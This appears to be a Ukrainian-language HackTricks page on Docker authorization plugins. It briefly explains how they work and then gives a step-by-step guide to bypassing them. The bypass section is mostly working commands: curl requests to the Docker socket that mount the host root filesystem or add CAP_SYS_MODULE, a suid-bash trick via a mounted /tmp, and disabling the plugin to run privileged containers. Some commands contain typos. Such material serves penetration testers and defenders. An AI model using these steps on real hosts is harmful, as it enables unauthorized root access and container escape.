<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>


**Стандартна модель авторизації Docker** - це **все або нічого**. Будь-який користувач з дозволом на доступ до демона Docker може **виконати будь-яку** команду клієнта Docker. Те ж саме стосується викликачів, які використовують API двигуна Docker для зв'язку з демоном. Якщо вам потрібен **більший контроль доступу**, ви можете створити **плагіни авторизації** та додати їх до конфігурації демона Docker. Використовуючи плагін авторизації, адміністратор Docker може **налаштувати дрібничковий доступ** до політик управління доступом до демона Docker.

# Основна архітектура

Плагіни автентифікації Docker - це **зовнішні** **плагіни**, які можна використовувати для **дозволу/заборони** **дій**, запитаних до демона Docker **в залежності** від **користувача**, який їх запитав, та **дії**, **запитаної**.

**[Наступна інформація взята з документації](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Коли до демона Docker надходить **HTTP** **запит** через CLI або через API двигуна, підсистема **аутентифікації** передає запит встановленим **плагінам аутентифікації**. Запит містить користувача (викликача) та контекст команди. **Плагін** відповідає за вирішення, чи **дозволити** чи **заборонити** запит.

Нижче наведено діаграми послідовності для дозволеного та забороненого потоків авторизації:

![Потік дозволу авторизації](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Потік відмови авторизації](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Кожен запит, відправлений до плагіна, **включає аутентифікованого користувача, HTTP заголовки та тіло запиту/відповіді**. До плагіна передаються лише **ім'я користувача** та використаний **метод аутентифікації**. Найважливіше, **жодні** дані **автентифікації користувача** або токени не передаються. Нарешті, **не всі тіла запиту/відповіді надсилаються** до плагіна авторизації. Лише ті тіла запиту/відповіді, де `Content-Type` - або `text/*`, або `application/json`, надсилаються.

Для команд, які потенційно можуть захопити HTTP-з'єднання (`HTTP Upgrade`), таких як `exec`, плагін авторизації викликається лише для початкових HTTP-запитів. Як тільки плагін схвалює команду, авторизація не застосовується до решти потоку. Зокрема, дані потоку не передаються плагінам авторизації. Для команд, які повертають фрагментовану відповідь HTTP, такі як `logs` та `events`, до плагінів авторизації надсилається лише HTTP-запит.

Під час обробки запиту/відповіді деякі потоки авторизації можуть потребувати додаткових запитів до демона Docker. Для завершення таких потоків плагіни можуть викликати API демона подібно до звичайного користувача. Для активації цих додаткових запитів плагін повинен надати засоби для налаштування відповідних політик аутентифікації та безпеки адміністратору.

## Кілька плагінів

Ви відповідальні за **реєстрацію** вашого **плагіна** як частини **запуску** демона Docker. Ви можете встановити **кілька плагінів та ланцюговати їх разом**. Цей ланцюг може бути упорядкованим. Кожен запит до демона проходить через ланцюг по порядку. Тільки коли **всі плагіни надають доступ** до ресурсу, доступ надається.

# Приклади плагінів

## Twistlock AuthZ Broker

Плагін [**authz**](https://github.com/twistlock/authz) дозволяє створити простий **JSON** файл, який **плагін** буде **читати** для авторизації запитів. Таким чином, ви маєте можливість легко контролювати, які API-точки можуть досягти кожен користувач.

Ось приклад, який дозволить Алісі та Бобу створювати нові контейнери: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

На сторінці [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) ви можете знайти відношення між запитаною URL та дією. На сторінці [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) ви можете знайти відношення між іменем дії та дією

## Простий плагін Tutorial

Ви можете знайти **легкий для розуміння плагін** з докладною інформацією про встановлення та налагодження тут: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Прочитайте `README` та код `plugin.go`, щоб зрозуміти, як він працює.

# Обхід плагіна автентифікації Docker

## Перелік доступу

Основні речі для перевірки - **які точки доступу дозволені** та **які значення HostConfig дозволені**.

Для виконання цієї переліку ви можете **використовувати інструмент** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## заборонений `run --privileged`

### Мінімальні привілеї
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Запуск контейнера та отримання привілейованої сесії

У цьому випадку системний адміністратор **заборонив користувачам монтувати томи та запускати контейнери з прапорцем `--privileged` або надавати будь-які додаткові можливості контейнеру**:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Проте користувач може **створити оболонку всередині запущеного контейнера та надати їй додаткові привілеї**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Тепер користувач може вийти з контейнера, використовуючи будь-яку з [**раніше обговорених технік**](./#privileged-flag) та **підвищити привілеї** всередині хоста.

## Підключення записуваної теки

У цьому випадку системний адміністратор **заборонив користувачам запускати контейнери з прапорцем `--privileged`** або надавати будь-які додаткові можливості контейнеру, і дозволив лише підключення теки `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Зверніть увагу, що можливо ви не зможете монтувати папку `/tmp`, але ви можете змонтувати **іншу записувальну папку**. Ви можете знайти записувальні каталоги за допомогою: `find / -writable -type d 2>/dev/null`

**Зверніть увагу, що не всі каталоги на лінукс-машині підтримуватимуть біт suid!** Щоб перевірити, які каталоги підтримують біт suid, виконайте `mount | grep -v "nosuid"` Наприклад, зазвичай `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` та `/var/lib/lxcfs` не підтримують біт suid.

Також зверніть увагу, що якщо ви можете **змонтувати `/etc`** або будь-яку іншу папку, **яка містить файли конфігурації**, ви можете змінювати їх з контейнера docker як root, щоб **зловживати ними на хості** та підвищувати привілеї (можливо, змінюючи `/etc/shadow`)
{% endhint %}

## Неперевірений кінцевий API

Відповідальність адміністратора системи, який налаштовує цей плагін, полягає в контролі за тими діями та з якими привілеями кожен користувач може виконувати. Тому, якщо адміністратор використовує **чорний список** з кінцевими точками та атрибутами, він може **забути деякі з них**, що може дозволити зловмиснику **підвищити привілеї.**

Ви можете перевірити API docker за посиланням [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Неперевірена структура JSON

### Прив'язки в кореневий каталог

Можливо, коли адміністратор системи налаштовував брандмауер docker, він **забув про деякий важливий параметр** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) такий як "**Прив'язки**".\
У наступному прикладі можна скористатися цією помилкою конфігурації для створення та запуску контейнера, який монтує кореневий (/) каталог хоста:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Зверніть увагу, що в цьому прикладі ми використовуємо параметр **`Binds`** як ключ на рівні кореня в JSON, але в API він з'являється під ключем **`HostConfig`**
{% endhint %}

### Binds у HostConfig

Виконайте ті ж інструкції, що й з **Binds в корені**, виконуючи цей **запит** до API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Монти в кореневу директорію

Виконайте ті ж інструкції, що й з **Прив'язками в кореневу директорію**, виконавши цей **запит** до API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Монти в HostConfig

Виконайте ті ж інструкції, що й з **Прив'язками в корінь**, виконавши цей **запит** до Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Неперевірений атрибут JSON

Можливо, коли системний адміністратор налаштовував брандмауер docker, він **забув про деякий важливий атрибут параметра** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) як "**Capabilities**" всередині "**HostConfig**". У наступному прикладі можна скористатися цією помилкою конфігурації для створення та запуску контейнера з можливістю **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** - це ключ, який зазвичай містить **цікаві** **привілеї** для виходу з контейнера. Однак, як ми вже обговорювали раніше, слід зауважити, що використання Binds поза ним також працює і може дозволити вам обійти обмеження.
{% endhint %}

## Вимкнення плагіна

Якщо **системний адміністратор** **забув** заборонити можливість **вимкнення** **плагіна**, ви можете скористатися цим, щоб повністю вимкнути його!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Не забудьте **перезапустить плагін після підвищення привілеїв**, інакше **перезапуск служби Docker не спрацює**!

## Звіти про обхід Auth Plugin

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Посилання

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF-форматі**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв.

</details>
